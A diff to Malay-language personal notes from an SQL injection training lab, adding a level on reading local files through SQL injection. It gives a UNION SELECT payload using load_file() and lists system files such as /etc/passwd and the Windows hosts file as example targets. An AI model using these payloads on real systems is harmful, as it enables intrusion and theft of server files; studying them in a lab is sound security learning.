@@ -224,6 +224,20 @@ SQL Injection Training Lab notes for me (Malay Language)
 
 ## Level J - Bypass Real Escape String
 
-- Semua step sama macam [Level I - Bypass AddSlashes SQL Injection](#level-i---bypass-addslashes-sql-injection)
+- Semua step sama macam [Level I - Bypass AddSlashes SQL Injection](#level-i---bypass-addslashes-sql-injection).
+
+- Done!
+
+## Level K - SQLi to Local File Inclusion Attack
+
+- Semua step sama macam [Level A - Basic GET SQL Injection](#level-a---basic-get-sql-injection).
+
+- Yang beza berada disini, Payload `-1'+union+all+select+1,load_file("c://xampp/htdocs/test/html.html"),3,4,5--+`, path `load_file` bergantung pada web storage masing-masing. Gambar bawah menunjukkan content dalam file html.html yang direka.
+- contoh path:
+  - /etc/passwd
+  - /etc/hosts
+  - c:/Windows/System32/drivers/etc/hosts
+
+![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5b86fda2-a9ff-4588-a7a6-becb84ca3402)
 
 - Done!
